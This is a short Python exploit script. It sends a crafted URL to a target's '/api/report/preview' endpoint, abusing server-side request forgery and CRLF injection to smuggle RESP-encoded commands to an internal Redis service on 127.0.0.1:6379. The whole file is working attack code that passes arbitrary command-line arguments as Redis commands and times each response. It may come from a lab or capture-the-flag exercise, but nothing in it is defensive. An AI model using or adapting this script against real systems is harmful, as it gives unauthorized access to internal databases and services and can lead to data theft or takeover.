#!/usr/bin/env python3
import requests,time,sys
T=open('target.txt').read().strip();E=f'http://{T}/api/report/preview'
def resp(*args):
 b=f'*{len(args)}\r\n'.encode()
 for a in args:
  if isinstance(a,str):a=a.encode()
  b+=f'${len(a)}\r\n'.encode()+a+b'\r\n'
 return b
def send(*cmds):
 p=b''.join(resp(*x) for x in cmds)+resp('QUIT')
 # latin1 maps byte for byte through JSON/UTF-8 only for ASCII; commands are ASCII
 u='http://127.0.0.1:6379/foo\r\n'+p.decode('ascii')
 t=time.monotonic();r=requests.post(E,json={'url':u},timeout=30);dt=time.monotonic()-t
 print(f'{dt:.3f}s {r.status_code} {r.text[:1000]}');return dt,r
if __name__=='__main__':send(tuple(sys.argv[1:]) if len(sys.argv)>1 else ('PING',))
